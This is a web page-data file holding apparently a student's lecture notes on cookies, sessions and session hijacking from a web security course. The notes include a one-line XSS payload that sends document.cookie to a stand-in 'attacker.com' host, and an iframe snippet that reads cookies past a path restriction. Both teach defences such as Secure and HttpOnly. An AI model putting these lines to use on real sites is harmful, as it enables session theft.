{"componentChunkName":"component---node-modules-gatsby-theme-andy-src-templates-note-js","path":"/websec-lecture-3","result":{"data":{"brainNote":{"slug":"websec-lecture-3","title":"Lecture 3 Session Attacks","childMdx":{"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Lecture 3 Session Attacks\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"The server can set cookies with \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Set-Cookie: theme=dark;\"), \" (Header Name, Cookie Name, Cookie Value).\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"The browser automatically adds cookies with every request.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Cookies are so old they precede the SOP. You basically set an expiration date on the Cookie and clear it by setting a date in the past.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Sign cookies to prevent tampering.\")), mdx(\"h3\", null, \"Sessions\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Server wants to keep data about the user over multiple requests. (ex: Logins, shopping carts, user tracking)\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"strong\", {\n    parentName: \"li\"\n  }, \"Ambient Authority\"), \": access control based on global/persistent property of the user (as long as they specify an action, it will be done).\\nThere are 4 ways of doing this: Cookies (common), IP checking (used at Stanford for lib resources), built-in HTTP auth (rare), client certs (rare)\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Generate a random number, use that as session ID and store it. Make these unguessable and delete them from DB on logout.\")), mdx(\"h3\", null, \"Signature Schemes\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Triple of algorithms (G, S, V)\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Generator (\", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"G() -> (pk, sk)\"), \"), Signer (\", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"S(sk, x) -> t\"), \"), Verifier (\", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"V(pk, x, t) -> accept/reject\"), \").\")), mdx(\"h3\", null, \"History of Cookies\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Implemented in 1994 in Netscape, described in 4 pages. No spec for 17 years.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Ad-hoc design has led to interesting issues.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"There were several attempts but they had incompatible changes -- one in 1997, another in 2000 (Cookie2), and finally one succeeded (RFC 6265) in 2011.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Cookies are a weird special case that behaves differently from everything else on the web.\")), mdx(\"h3\", null, \"Cookie Attributes\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Expires: Specifies expiration date. If no date, lasts for session (until you close browser, but now there's session restoration).\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Path: Scope the \\\"Cookie\\\" header to a particular path prefix. e.g. \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Path=/docs\"), \" matches \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"/docs\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"/docs/web\"), \". Don't use this for security.\")), mdx(\"h3\", null, \"Accessing Cookies from JS\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"document.cookie = 'name=Feross'\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"document.cookie = 'favoriteFood=Cookies; Path=/'\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"document.cookie\"), \" is now \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"name=Feross; favoriteFood=Cookies;\"), \" (it didn't delete)\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"document.cookie = 'name=; Expires=Thu, 01 Jan 1070...'\"), \" in order to delete\")), mdx(\"h3\", null, \"Session Hijacking\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Session hijacking works by stealing cookies.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"This can happen over HTTP (not S).\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Use \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Secure\"), \" cookie attribute to prevent the cookie from being sent over unencrypted HTTP.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"e.g. \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Set-Cookie: key=value; Secure\"), \" (or just use HTTPS for the whole website.)\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"XSS: Attacker can insert their code and easily exfiltrate the user's cookie. \"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"e.g. \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Protect cookies from XSS: Prevent it from being used in JS: \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Set-Cookie: key-value; Secure; Httponly\"))), mdx(\"h4\", null, \"How to get around path restriction for cookies: add an iframe.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"const iframe = document.createElement('iframe')\\niframe.src= = 'https://web.stanford.edu/class/cs106a'\\ndocument.body.append(iframe)\\niframe.style.display = 'none' // Set iframe to be invisible\\n// contentDocument is the equivalent of their document. We can cross\\n// this boundary to see their equivalent of document\\niframe.contentDocument.cookie\\n\")), mdx(\"p\", null, \"Only use path as an optimization!\"), mdx(\"h4\", null, \"How do we make the cookie \", mdx(\"inlineCode\", {\n    parentName: \"h4\"\n  }, \"path\"), \" secure?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"No.\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Cookies can only be accessed by equal or more-specific domains, so use subdomains (e.g. \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"cs106a.stanford.edu\"), \" vs \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"cs253.stanford.edu\"), \").\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"We just always set \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Path=/\"), \" and don't ever rely on it. \"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"Set-Cookie: key=value; Secure; HttpOnly; Path=/\"), \": Set cookie, \")));\n}\n;\nMDXContent.isMDXComponent = true;"},"inboundReferenceNotes":[{"title":"Stanford Web Security","slug":"stanford-web-security","childMdx":{"excerpt":"Course Webpage Websec Lecture 1 : How does the internet work? Websec Assignment 1 :  https://web.stanford.edu/class/cs253/assign0 Websecâ€¦"}}],"outboundReferenceNotes":[]},"site":{"siteMetadata":{"title":"aeonneo's notes"}}},"pageContext":{"slug":"websec-lecture-3"}}}